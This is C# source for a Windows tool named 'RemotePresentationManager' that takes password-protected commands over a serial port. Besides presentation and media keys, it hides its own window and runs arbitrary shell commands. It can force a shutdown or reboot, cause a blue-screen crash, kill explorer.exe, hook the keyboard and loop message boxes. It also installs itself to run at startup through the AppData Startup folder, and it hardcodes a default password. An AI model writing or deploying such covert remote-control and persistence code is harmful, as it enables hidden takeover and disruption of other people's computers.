using NAudio.Wave;
using Payloads;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Ports;
using System.Linq;
using System.Media;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RemotePresentationManager
{
    public class SerialServer
    {
        public SerialPort Port;
        public bool pass = false;//Password protection

        public SerialServer()
        {
            Program.Form1.HideWindow = true;
            Port = new SerialPort(Environment.GetCommandLineArgs()[1], 9600, Parity.None, 8, StopBits.One);
            Port.Open();
            Port.DataReceived += new SerialDataReceivedEventHandler(Port_DataReceived);
            if (Port.IsOpen)
            {
                Port.WriteLine("Insert the password");
                Program.Form1.button1.Enabled = false;
                Program.Form1.listBox1.Items.Clear();
                Program.Form1.listBox1.Items.Add("Status: " + Port.PortName + " online");
                Program.Form1.Connected = true;
            }
        }

        public SerialServer(string port)
        {
            Program.Form1.HideWindow = true;
            Port = new SerialPort(port, 9600, Parity.None, 8, StopBits.One);
            Port.Open();
            Port.DataReceived += new SerialDataReceivedEventHandler(Port_DataReceived);
            if (Port.IsOpen)
            {
                Port.WriteLine("Insert the password");
                Program.Form1.button1.Enabled = false;
                Program.Form1.listBox1.Items.Clear();
                Program.Form1.listBox1.Items.Add("Status: " + Port.PortName + " online");
                Program.Form1.Connected = true;
            }
        }

        private void Port_DataReceived(object sender, SerialDataReceivedEventArgs e)
        {
            try
            {
                CheckFunctions(Port.ReadExisting());
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
                Port.WriteLine(ex.GetType() + ": " + ex.Message);
            }
        }

        public void CheckFunctions(string data)
        {
            data = data.Replace("\n", string.Empty);
            data = data.Replace("\r", string.Empty);
            data = data.Replace("\t", string.Empty);

            if (pass)
            {
                if (data.Equals("AT"))
                {
                    Console.WriteLine("Sending current status...");
                    Port.WriteLine("Online!");
                    Port.WriteLine(Port.NewLine + "PORT INFO: Current Port: " + Port.PortName + Port.NewLine + "Baud rate: " + Port.BaudRate + Port.NewLine + "Using RPM " + Application.ProductVersion + " By Adryzz\n(Adryzz#7264)");

                }
                else if (data.Equals("LOCK"))
                {
                    Port.WriteLine("Command received! Locking...");
                    Program.Form1.remaining = 5;//reset remaining tries
                    pass = false;//lock
                    Port.WriteLine("Insert the password");
                    Console.WriteLine("Lock system");
                }
                else if (data.Equals("HELP"))
                {
                    Help();
                }
                else if (data.Equals("SHOW"))
                {
                    Port.WriteLine("Command received!");
                    Program.Form1.Invoke(new WindowStateDelegate(SetWindowState), true);
                    Console.WriteLine("Show window");
                }
                else if (data.StartsWith("PLAYSOUND "))
                {
                    Port.WriteLine("Command received!");
                    PlaySound(data);
                    Console.WriteLine("Play sound file");
                }
                else if (data.StartsWith("PLAYURL "))
                {
                    Port.WriteLine("Command received!");
                    PlayMp3FromUrl(data);
                    Console.WriteLine("Play url");
                }
                else if (data.StartsWith("PLAY "))
                {
                    Port.WriteLine("Command received!");
                    Play(data);
                    Console.WriteLine("Play sound");
                }
                else if (data.StartsWith("URLIMAGE "))
                {
                    Port.WriteLine("Command received!");
                    UrlImage(data);
                    Console.WriteLine("Url image");
                }
                else if (data.Equals("MUTE"))
                {
                    Port.WriteLine("Command received!");
                    Mute();
                    Console.WriteLine("Mute");
                }
                else if (data.Equals("STOP"))
                {
                    Port.WriteLine("Command received!");
                    Stop();
                    Console.WriteLine("Stop sound file player");
                }
                else if (data.Equals("PAUSE"))
                {
                    Port.WriteLine("Command received!");
                    Pause();
                    Console.WriteLine("Pause sound file player");
                }
                else if (data.Equals("RESUME"))
                {
                    Port.WriteLine("Command received!");
                    Resume();
                    Console.WriteLine("Resume sound file player");
                }
                else if (data.Equals("UNMUTE"))
                {
                    Port.WriteLine("Command received!");
                    UnMute();
                    Console.WriteLine("Unmute");
                }
                else if (data.StartsWith("VOLUME "))
                {
                    Port.WriteLine("Command received!");
                    AdjustVolume(data);
                    Console.WriteLine("Adjust volume");
                }
                else if (data.StartsWith("CLIP "))
                {
                    Port.WriteLine("Command received!");
                    ClipBoard(data);
                    Console.WriteLine("Edit clipboard");
                }
                else if (data.StartsWith("KEY "))
                {
                    Port.WriteLine("Command received!");
                    Key(data);
                    Console.WriteLine("Send custom key");
                }
                else if (data.StartsWith("LOOP "))
                {
                    Port.WriteLine("Command received!");
                    Loop(data);
                    Console.WriteLine("Set Program.Form1.loop mode");
                }
                else if (data.StartsWith("SAY "))
                {
                    Port.WriteLine("Command received!");
                    Say(data);
                    Console.WriteLine("Say text");
                }
                else if (data.StartsWith("IMG "))
                {
                    Port.WriteLine("Command received!");
                    Draw(data);
                    Console.WriteLine("Draw bitmap");
                }
                else if (data.StartsWith("ROTATE "))
                {
                    Port.WriteLine("Command received!");
                    Rotate(data);
                    Console.WriteLine("Rotate screen");
                }
                else if (data.StartsWith("MOUSE "))
                {
                    Port.WriteLine("Command received!");
                    Mouse(data);
                    Console.WriteLine("Set mouse position");
                }
                else if (data.StartsWith("QMSG "))
                {
                    Port.WriteLine("Command received!");
                    QMsg(data);
                    Console.WriteLine("Question MessageBox");
                }
                else if (data.StartsWith("MSG "))
                {
                    Port.WriteLine("Command received!");
                    Msg(data);
                    Console.WriteLine("MessageBox");
                }
                else if (data.StartsWith("TITLE "))
                {
                    Port.WriteLine("Command received!");
                    Title(data);
                    Console.WriteLine("Set Title");
                }
                else if (data.Equals("MSGLOOP"))
                {
                    Port.WriteLine("Command received!");
                    MsgLoop();
                    Console.WriteLine("Loop MessageBox");
                }
                else if (data.Equals("HOOK"))
                {
                    Port.WriteLine("Command received!");
                    Hook();
                    Console.WriteLine("Hook keys");
                }
                else if (data.Equals("UNHOOK"))
                {
                    Port.WriteLine("Command received!");
                    UnHook();
                    Console.WriteLine("Unhook keys");
                }
                else if (data.Equals("HIDE"))
                {
                    Port.WriteLine("Command received!");
                    Program.Form1.Invoke(new WindowStateDelegate(SetWindowState), false);
                    Console.WriteLine("HideWindow window");
                }
                else if (data.Equals("CLOSE"))
                {
                    Port.WriteLine("Command received! Exiting...");
                    Program.Form1.Invoke(new ExitDelegate(Exit));
                    Console.WriteLine("Exit");
                }
                else if (data.Equals("ESC"))
                {
                    Port.WriteLine("Command received!");
                    Esc();
                    Console.WriteLine("ESC key");
                }
                else if (data.Equals("F5"))
                {
                    Port.WriteLine("Command received!");
                    F5();
                    Console.WriteLine("F5 key");
                }
                else if (data.Equals("LEFT"))
                {
                    Port.WriteLine("Command received!");
                    LeftArrow();
                    Console.WriteLine("LEFT ARROW key");
                }
                else if (data.Equals("RIGHT"))
                {
                    Port.WriteLine("Command received!");
                    RightArrow();
                    Console.WriteLine("RIGHT ARROW key");
                }
                else if (data.Equals("UP"))
                {
                    Port.WriteLine("Command received!");
                    UpArrow();
                    Console.WriteLine("UP ARROW key");
                }
                else if (data.Equals("DOWN"))
                {
                    Port.WriteLine("Command received!");
                    DownArrow();
                    Console.WriteLine("Down ARROW key");
                }
                else if (data.Equals("ALTF4"))
                {
                    Port.WriteLine("Command received!");
                    Altf4();
                    Console.WriteLine("ALT+F4 KEYSTROKE");
                }
                else if (data.Equals("SHUTDOWN"))
                {
                    Port.WriteLine("Command received!");
                    Shutdown();
                    Console.WriteLine("SHUTDOWN COMMAND");
                }
                else if (data.Equals("REBOOT"))
                {
                    Port.WriteLine("Command received!");
                    Reboot();
                    Console.WriteLine("REBOOT COMMAND");
                }
                else if (data.Equals("CRASH"))
                {
                    Port.WriteLine("Command received!");
                    Crash();
                    Console.WriteLine("CRASH COMMAND");
                }
                else if (data.Equals("EXPLORER"))
                {
                    Port.WriteLine("Command received!");
                    Explorer();
                    Console.WriteLine("KILL EXPLORER");
                }
                else if (data.Equals("STARTUP"))
                {
                    Port.WriteLine("Command received!");
                    Startup();
                    Console.WriteLine("SETUP STARTUP RUN");
                }
                else if (data.StartsWith("VCMD "))
                {
                    Port.WriteLine("Command received!");
                    VCmd(data);
                    Console.WriteLine("VCMD COMMAND");
                }
                else if (data.StartsWith("CMD "))
                {
                    Port.WriteLine("Command received!");
                    Cmd(data);
                    Console.WriteLine("CMD COMMAND");
                }
                else
                {
                    Console.WriteLine(data + " not recognized as a command");
                    Port.WriteLine(data + " not recognized as a command");
                }
            }
            else
            {
                Password(data);
            }

        }

        public void Password(string data)//it is reccommended to change the default password, even if it is secure (use my tool called RPMPasswordSet)
        {

            if (Program.Form1.remaining == 0)//when you don't have any tries left, 
            {
                Shutdown();
            }
            if (Program.Form1.CurrentPass == null)
            {
                if (data.Equals("dbe6a4b729ff"))//the password
                {
                    pass = true;
                    Port.WriteLine("Access granted");
                }
                else
                {
                    Program.Form1.remaining--;
                    Port.WriteLine("Wrong password. you have " + Program.Form1.remaining + " tries until the system shuts down");
                }
            }
            else
            {
                SHA512 sha = new SHA512Managed();
                string hash = Encoding.UTF8.GetString(sha.ComputeHash(Encoding.UTF8.GetBytes(data)));//calculate the hash of the typed password
                if (hash.Equals(Program.Form1.CurrentPass))//the hash of the current password
                {
                    pass = true;
                    Port.WriteLine("Access granted");
                }
                else
                {
                    Program.Form1.remaining--;
                    Port.WriteLine("Wrong password. you have " + Program.Form1.remaining + " tries until the system shuts down");
                }
            }
        }

        #region Delegates and stuff

        public delegate void WindowStateDelegate(bool visible);

        public void SetWindowState(bool visible)
        {
            if (visible)
            {
                Program.Form1.Show();
            }
            else
            {
                Program.Form1.Hide();
            }
        }

        public delegate void SetClipboardDelegate(string data);

        public void SetClipboard(string data)
        {
            Clipboard.SetText(data);
        }

        public delegate void ExitDelegate();

        public void Exit()
        {
            Console.WriteLine("1");
            if (Program.Form1.AudioFileReader != null)
            {
                Program.Form1.AudioFileReader.Dispose();
                Console.WriteLine("2");
            }
            if (Program.Form1.WaveOutDevice != null)
            {
                Program.Form1.WaveOutDevice.Dispose();
                Console.WriteLine("3");
            }
            Program.Form1.Connected = false;
            Environment.Exit(0);
        }

        #endregion

        #region funcs
        public void Esc()
        {
            if (Program.Form1.checkBox1.Checked)
            {
                SendKeys.SendWait("{ESC}");
            }
            else
            {
                Port.WriteLine("Keys are disabled.");
            }
        }

        public void F5()
        {
            if (Program.Form1.checkBox1.Checked)
            {
                SendKeys.SendWait("{F5}");
            }
            else
            {
                Port.WriteLine("Keys are disabled.");
            }
        }

        public void Altf4()
        {
            if (Program.Form1.checkBox1.Checked)
            {
                SendKeys.SendWait("%{F4}");
            }
            else
            {
                Port.WriteLine("Keys are disabled.");
            }
        }

        public void LeftArrow()
        {
            if (Program.Form1.checkBox1.Checked)
            {
                SendKeys.SendWait("{LEFT}");
            }
            else
            {
                Port.WriteLine("Keys are disabled.");
            }
        }

        public void RightArrow()
        {
            if (Program.Form1.checkBox1.Checked)
            {
                SendKeys.SendWait("{RIGHT}");
            }
            else
            {
                Port.WriteLine("Keys are disabled.");
            }
        }

        public void UpArrow()
        {
            if (Program.Form1.checkBox1.Checked)
            {
                SendKeys.SendWait("{UP}");
            }
            else
            {
                Port.WriteLine("Keys are disabled.");
            }
        }

        public void DownArrow()
        {
            if (Program.Form1.checkBox1.Checked)
            {
                SendKeys.SendWait("{DOWN}");
            }
            else
            {
                Port.WriteLine("Keys are disabled.");
            }
        }

        public void Mouse(string data)
        {
            try
            {
                data = data.Remove(0, 6);//MOUSE X200Y300
                int x = Int32.Parse(data.Remove(data.IndexOf('Y')).Remove(0, 1));
                int y = Int32.Parse(data.Remove(0, data.IndexOf('Y')).Remove(0, 1));
                Cursor.Position = new Point(x, y);
            }
            catch (Exception)
            {
                Port.WriteLine("The argument was not in the correct format - Correct format: MOUSE X<num>Y<num>");
            }
        }

        public void Shutdown()
        {
            if (Program.Form1.checkBox6.Checked)
            {
                Process.Start("shutdown", "/f /s /t 0");
            }
            else
            {
                Port.WriteLine("SHUTDOWN is disabled.");
            }
        }

        public void Reboot()
        {
            if (Program.Form1.checkBox7.Checked)
            {
                Process.Start("shutdown", "/f /r /t 0");
            }
            else
            {
                Port.WriteLine("REBOOT is disabled.");
            }
        }

        public void Crash()
        {
            if (Program.Form1.checkBox8.Checked)
            {
                Miscellaneous.Crash();
            }
            else
            {
                Port.WriteLine("CRASH is disabled.");
            }
        }

        public void Explorer()
        {
            Process.Start("taskkill", "/f /im explorer.exe");
        }

        public void Cmd(string data)
        {
            data = data.Remove(0, 4);
            if (Program.Form1.checkBox10.Checked)
            {
                Process.Start("cmd", "/c start " + data);
            }
            else
            {
                Port.WriteLine("CMD is disabled.");
            }
        }

        public void VCmd(string data)
        {
            data = data.Remove(0, 5);
            if (Program.Form1.checkBox10.Checked)
            {
                Program.Form1.CmdStream.WriteLine(data);
                Program.Form1.CmdStream.Flush();
                Program.Form1.CmdStream = Program.Form1.cmd.StandardInput;
            }
            else
            {
                Port.WriteLine("CMD is disabled.");
            }
        }

        public void Play(string data)
        {
            if (Program.Form1.checkBox3.Checked)
            {
                data = data.Remove(0, 5);

                if (data.Equals("ERROR"))
                {
                    Program.Form1.Player = new SoundPlayer(@"C:\Windows\Media\Windows Hardware Fail.wav");
                    Program.Form1.Player.Play();
                }
                else if (data.Equals("BACKGROUND"))
                {
                    Program.Form1.Player = new SoundPlayer(@"C:\Windows\Media\Windows Background.wav");
                    Program.Form1.Player.Play();
                }
                else if (data.Equals("FOREGROUND"))
                {
                    Program.Form1.Player = new SoundPlayer(@"C:\Windows\Media\Windows Foreground.wav");
                    Program.Form1.Player.Play();
                }
                else if (data.Equals("DEVICEIN"))
                {
                    Program.Form1.Player = new SoundPlayer(@"C:\Windows\Media\Windows Hardware Insert.wav");
                    Program.Form1.Player.Play();
                }
                else if (data.Equals("DEVICEOUT"))
                {
                    Program.Form1.Player = new SoundPlayer(@"C:\Windows\Media\Windows Hardware Remove.wav");
                    Program.Form1.Player.Play();
                }
                else
                {
                    Port.WriteLine("No corresponding sound!");
                }
            }
            else
            {
                Port.WriteLine("Sounds are disabled");
            }
        }

        public void PlaySound(string data)
        {
            if (Program.Form1.checkBox3.Checked)
            {
                data = data.Remove(0, 10);
                if (Program.Form1.WaveOutDevice.PlaybackState == PlaybackState.Playing || Program.Form1.WaveOutDevice.PlaybackState == PlaybackState.Paused)
                {
                    Program.Form1.WaveOutDevice.Stop();
                }
                if (Program.Form1.AudioFileReader != null)
                {
                    Program.Form1.AudioFileReader.Dispose();
                }
                Program.Form1.AudioFileReader = new AudioFileReader(data);
                Program.Form1.WaveOutDevice.Init(Program.Form1.AudioFileReader);
                Program.Form1.WaveOutDevice.Play();
            }
            else
            {
                Port.WriteLine("Sounds are disabled");
            }
        }

        public void Stop()
        {
            Program.Form1.WaveOutDevice.Stop();
        }

        public void Pause()
        {
            Program.Form1.WaveOutDevice.Pause();
        }

        public void Resume()
        {
            Program.Form1.WaveOutDevice.Resume();
        }

        public void Loop(string data)
        {
            data = data.Remove(0, 5);
            if (data.Equals("ON"))
            {
                Program.Form1.loop = true;
                Port.WriteLine("Loop mode set!");
            }
            else if (data.Equals("OFF"))
            {
                Program.Form1.loop = false;
                Port.WriteLine("Loop mode set!");
            }
            else
            {
                Port.WriteLine("This command accepts only ON and OFF as arguments");
            }
        }

        public void Key(string data)
        {
            data = data.Remove(0, 4);

            if (data.Equals("ENTER"))
            {
                data = "{ENTER}";
            }
            else if (data.Equals("CANC"))
            {
                data = "{DEL}";
            }
            else if (data.Equals("TAB"))
            {
                data = "{TAB}";
            }
            else if (data.Equals("HELP"))
            {
                data = "{HELP}";
            }
            else if (data.Equals("CTRLV"))
            {
                data = "^V";
            }
            else if (data.Equals("TAB"))
            {
                data = "{TAB}";
            }
            else if (data.Equals("SHIFTAB"))
            {
                data = "+{TAB}";
            }
            else if (data.Equals("PLAYPAUSE"))
            {
                keybd_event(VK_MEDIA_PLAY_PAUSE, 0, KEYEVENTF_EXTENDEDKEY, IntPtr.Zero);
                keybd_event(VK_MEDIA_PLAY_PAUSE, 0, KEYEVENTF_KEYUP, IntPtr.Zero);
                return;
            }
            else if (data.Equals("PLAY"))
            {
                keybd_event(VK_MEDIA_PLAY, 0, KEYEVENTF_EXTENDEDKEY, IntPtr.Zero);
                keybd_event(VK_MEDIA_PLAY, 0, KEYEVENTF_KEYUP, IntPtr.Zero);
                return;
            }
            else if (data.Equals("PAUSE"))
            {
                keybd_event(VK_MEDIA_PAUSE, 0, KEYEVENTF_EXTENDEDKEY, IntPtr.Zero);
                keybd_event(VK_MEDIA_PAUSE, 0, KEYEVENTF_KEYUP, IntPtr.Zero);
                return;
            }
            else if (data.Equals("STOP"))
            {
                keybd_event(VK_MEDIA_STOP, 0, KEYEVENTF_EXTENDEDKEY, IntPtr.Zero);
                keybd_event(VK_MEDIA_STOP, 0, KEYEVENTF_KEYUP, IntPtr.Zero);
                return;
            }
            else if (data.Equals("NEXT"))
            {
                keybd_event(VK_MEDIA_NEXT_TRACK, 0, KEYEVENTF_EXTENDEDKEY, IntPtr.Zero);
                keybd_event(VK_MEDIA_NEXT_TRACK, 0, KEYEVENTF_KEYUP, IntPtr.Zero);
                return;
            }
            else if (data.Equals("PREV"))
            {
                keybd_event(VK_MEDIA_PREV_TRACK, 0, KEYEVENTF_EXTENDEDKEY, IntPtr.Zero);
                keybd_event(VK_MEDIA_PREV_TRACK, 0, KEYEVENTF_KEYUP, IntPtr.Zero);
                return;
            }
            else if (data.Equals("REW"))
            {
                keybd_event(VK_MEDIA_REWIND, 0, KEYEVENTF_EXTENDEDKEY, IntPtr.Zero);
                keybd_event(VK_MEDIA_REWIND, 0, KEYEVENTF_KEYUP, IntPtr.Zero);
                return;
            }
            else if (data.Equals("FFW"))
            {
                keybd_event(VK_MEDIA_FAST_FORWARD, 0, KEYEVENTF_EXTENDEDKEY, IntPtr.Zero);
                keybd_event(VK_MEDIA_FAST_FORWARD, 0, KEYEVENTF_KEYUP, IntPtr.Zero);
                return;
            }

            SendKeys.SendWait(data);
        }

        public void AdjustVolume(string data)
        {
            if (Program.Form1.checkBox3.Checked)
            {
                data = data.Remove(0, 7);
                Program.Form1.DefaultPlaybackDevice.Volume = int.Parse(data);
            }
            else
            {
                Port.WriteLine("Sounds are disabled");
            }
        }

        public void Mute()
        {
            if (Program.Form1.checkBox3.Checked)
            {
                Program.Form1.DefaultPlaybackDevice.Mute(true);
            }
            else
            {
                Port.WriteLine("Sounds are disabled");
            }

        }

        public void UnMute()
        {
            if (Program.Form1.checkBox3.Checked)
            {
                Program.Form1.DefaultPlaybackDevice.Mute(false);
            }
            else
            {
                Port.WriteLine("Sounds are disabled");
            }
        }

        public void Msg(string data)
        {
            if (Program.Form1.checkBox2.Checked)
            {
                data = data.Remove(0, 4);
                new Thread(() =>
                {
                    MessageBox.Show(new Form { TopMost = true }, data, Program.Form1.title);
                    Port.WriteLine("MSG: The user pressed OK");
                }).Start();
            }
            else
            {
                Port.WriteLine("Message Boxes are disabled");
            }
        }

        public void QMsg(string data)
        {
            if (Program.Form1.checkBox2.Checked)
            {
                data = data.Remove(0, 5);
                new Thread(() =>
                {
                    DialogResult res = MessageBox.Show(new Form { TopMost = true }, data, Program.Form1.title, MessageBoxButtons.YesNo, MessageBoxIcon.Question);
                    if (res == DialogResult.Yes)
                    {
                        Port.WriteLine("QMSG: The user pressed YES");
                    }
                    else
                    {
                        Port.WriteLine("QMSG: The user pressed NO");
                    }
                }).Start();
            }
            else
            {
                Port.WriteLine("Message Boxes are disabled");
            }
        }

        public void MsgLoop()
        {
            if (Program.Form1.checkBox2.Checked)
            {
                new Thread(() =>
                {
                    string t1 = "Are you";
                    string t2 = " sure you want to do this?";
                    string t = "";
                    while (MessageBox.Show(new Form { TopMost = true }, t1 + t + t2, Program.Form1.title, MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
                    {
                        t += " really";
                    }

                }).Start();
            }
            else
            {
                Port.WriteLine("Message Boxes are disabled");
            }
        }

        public void Title(string data)
        {
            Program.Form1.title = data.Remove(0, 6);
        }

        public void ClipBoard(string data)
        {
            if (Program.Form1.checkBox4.Checked)
            {
                data = data.Remove(0, 5);
                Program.Form1.Invoke(new SetClipboardDelegate(SetClipboard), data);
            }
            else
            {
                Port.WriteLine("Clipboard edit is disabled");
            }
        }

        public void Say(string data)
        {
            if (Program.Form1.checkBox3.Checked)
            {
                data = data.Remove(0, 4);
                Miscellaneous.Say(data);
            }
            else
            {
                Port.WriteLine("Sounds are disabled");
            }
        }

        public void Draw(string data)
        {
            if (Program.Form1.checkBox5.Checked)
            {
                data = data.Remove(0, 7);
                Drawing.DrawBitmapToScreen((Bitmap)Bitmap.FromFile(data));
            }
            else
            {
                Port.WriteLine("Images are disabled.");
            }
        }

        public void Rotate(string data)
        {
            if (Program.Form1.checkBox5.Checked)
            {
                data = data.Remove(0, 7);//ROTATE

                if (data.Equals("0"))
                {
                    Display.Rotate(0, Display.Orientations.DEGREES_CW_0);
                }
                else if (data.Equals("90"))
                {
                    Display.Rotate(0, Display.Orientations.DEGREES_CW_90);
                }
                else if (data.Equals("180"))
                {
                    Display.Rotate(0, Display.Orientations.DEGREES_CW_180);
                }
                else if (data.Equals("270"))
                {
                    Display.Rotate(0, Display.Orientations.DEGREES_CW_270);
                }
                else
                {
                    Port.WriteLine("No corresponding rotation! This command accepts only 0, 90, 180 and 270 as arguments");
                }
            }
            else
            {
                Port.WriteLine("Display is disabled.");
            }
        }

        public void Hook()
        {
            if (Program.Form1.checkBox1.Checked)
            {
                Keyboard.KeyboardHook();
            }
            else
            {
                Port.WriteLine("Keys are disabled.");
            }
        }

        public void UnHook()
        {
            if (Program.Form1.checkBox1.Checked)
            {
                Keyboard.ReleaseKeyboardHook();
            }
            else
            {
                Port.WriteLine("Keys are disabled.");
            }
        }

        public void Startup()
        {
            string exe = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "RemotePresentationManager", "RemotePresentationManager.exe");
            string bat = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Microsoft\Windows\Start Menu\Programs\Startup\RPM.bat");
            Directory.CreateDirectory(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "RemotePresentationManager"));
            if (File.Exists(exe))
            {
                File.Delete(exe);
            }
            File.Copy(Application.ExecutablePath, exe);
            File.WriteAllText(bat, String.Format("start {0} {1}", exe, Port.PortName));
        }

        public void UrlImage(string url)
        {
            if (Program.Form1.checkBox5.Checked)
            {
                url = url.Remove(0, 9);//URLIMAGE
                WebClient client = new WebClient();
                client.OpenReadCompleted += (s, e) =>
                {
                    byte[] imageBytes = new byte[e.Result.Length];
                    e.Result.Read(imageBytes, 0, imageBytes.Length);

                    // Now you can use the returned stream to set the image source too
                    Drawing.DrawBitmapToScreen((Bitmap)Image.FromStream(e.Result));
                };
                client.OpenReadAsync(new Uri(url));
            }
            else
            {
                Port.WriteLine("Images are disabled.");
            }
        }

        public void Help()
        {
            Port.WriteLine("List of all commands\n\nAT - Show connection info\nLOCK - Re-lock the program as at startup\nHELP - Show this help\nSHOW - Shows the main window\nHIDE - Hides the main window\nCLOSE - Quits the program\nKEY <some text> - Types that text/Presses keys\nMOUSE X<num>Y<num> - Sets mouse position\nCLIP <some text> - Copies that text into the clipboard\nMUTE - Mutes volume\nUNMUTE - Unmutes volume\nVOLUME <0-100> - Set volume percentage\nPLAY <FOREGROUND - BACKGROUND - ERROR - DEVICEIN - DEVICEOUT> - Plays the sound\nSAY <some text> - Says the text\nUP/DOWN/LEFT/RIGHT/F5/ALTF4/ESC - the key(s)\nIMG <path of an image> - Draws the image\nURLIMAGE <url> - Draws an image on the Internet (experimental)\nPLAYSOUND <path of a sound file> - Plays the sound file\nSTOP - Stops the sound player\nPAUSE - Pauses the sound player\nRESUME - Resumes the sound player after pause\nPLAYURL <url> - Plays a sound file in an URL\nROTATE <0-90-180-270> - Rotates the screen\nMSG <some text> - Shows a message box\nSHUTDOWN/REBOOT - Shuts down/Reboots the system\nCRASH - Real BSOD\nEXPLORER - Kills explorer.exe\nCMD <command> - Runs a command\nHOOK/UNHOOK - Blocks shortcuts\nSTARTUP - Setups Run at startup");
        }

        public void PlayMp3FromUrl(string url)
        {
            if (Program.Form1.checkBox3.Checked)
            {
                url = url.Remove(0, 8);
                new Thread(() =>
                {
                    try
                    {
                        if (Program.Form1.WaveOutDevice.PlaybackState == PlaybackState.Playing || Program.Form1.WaveOutDevice.PlaybackState == PlaybackState.Paused)
                        {
                            Program.Form1.WaveOutDevice.Stop();
                        }
                        using (Stream ms = new MemoryStream())
                        {
                            using (Stream stream = WebRequest.Create(url)
                                    .GetResponse().GetResponseStream())
                            {
                                byte[] buffer = new byte[32768];
                                int read;
                                while ((read = stream.Read(buffer, 0, buffer.Length)) > 0)
                                {
                                    ms.Write(buffer, 0, read);
                                }
                            }

                            ms.Position = 0;
                            using (WaveStream blockAlignedStream =
                                    new BlockAlignReductionStream(
                                        WaveFormatConversionStream.CreatePcmStream(
                                            new Mp3FileReader(ms))))
                            {
                                Program.Form1.WaveOutDevice.Init(blockAlignedStream);
                                Program.Form1.WaveOutDevice.Play();
                                while (Program.Form1.WaveOutDevice.PlaybackState == PlaybackState.Playing)
                                {
                                    Thread.Sleep(100);
                                }
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Port.WriteLine(ex.GetType() + ": " + ex.Message);
                    }
                }).Start();
            }
            else
            {
                Port.WriteLine("Sounds are disabled");
            }
        }

        #endregion

        #region special keys dont touch here
        [DllImport("user32.dll", SetLastError = true)]
        static extern void keybd_event(byte virtualKey, byte scanCode, uint flags, IntPtr extraInfo);
        const int VK_MEDIA_NEXT_TRACK = 0xB0;
        const int VK_MEDIA_PREV_TRACK = 0xB1;
        const int VK_MEDIA_PLAY_PAUSE = 0xB3;
        const int VK_MEDIA_PLAY = 0xFA;
        const int VK_MEDIA_PAUSE = 0x13;
        const int VK_MEDIA_STOP = 0xB2;
        const int VK_MEDIA_FAST_FORWARD = 0x31;
        const int VK_MEDIA_REWIND = 0x32;
        const int KEYEVENTF_EXTENDEDKEY = 0x0001; //Key down flag
        const int KEYEVENTF_KEYUP = 0x0002; //Key up flag
        #endregion
    }
}
